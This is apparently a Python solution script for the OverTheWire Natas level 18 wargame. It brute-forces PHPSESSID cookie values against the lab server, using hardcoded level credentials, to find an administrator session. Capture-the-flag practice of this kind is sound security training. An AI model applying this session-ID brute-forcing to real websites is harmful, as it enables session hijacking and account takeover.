# -*- coding: utf8 -*-

import requests

for i in range(640):
    if i % 20 == 0:
        print("rendus à " + str(i))

    url = "http://natas18.natas.labs.overthewire.org/index.php"
    cookie = {"PHPSESSID" : str(i)}
    auth = ("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

    r = requests.get(url, auth=auth, cookies=cookie)

    if "regular user" not in r.text:
        print(r.text)
